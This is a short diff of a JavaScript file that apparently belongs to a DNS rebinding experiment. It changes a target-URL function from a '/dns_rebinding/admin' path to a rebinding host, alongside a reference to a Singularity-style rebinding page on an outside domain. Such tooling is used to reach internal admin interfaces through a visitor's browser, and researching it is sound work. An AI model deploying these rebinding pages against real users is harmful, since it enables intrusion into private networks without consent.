@@ -25,13 +25,13 @@ function httpGet(theUrl)
     
 function TargetURL() {
   document.write("[In function TargetURL\n]");
-  var URL = window.location.hostname;
+  var URL = "rebind.it";
   var URL2 = "plopper.cloudns.cl"
-  URL = "https://" + URL + "/dns_rebinding/admin";
+  URL = "http://" + URL;
   URL2 = "http://" + URL2 + "/singularity.html";
   document.write("[In function TargetURL: TargetURL is:]");
-  document.write(URL2);
-  return URL2;
+  document.write(URL);
+  return URL;
 }
 
 document.write("Starting powing");
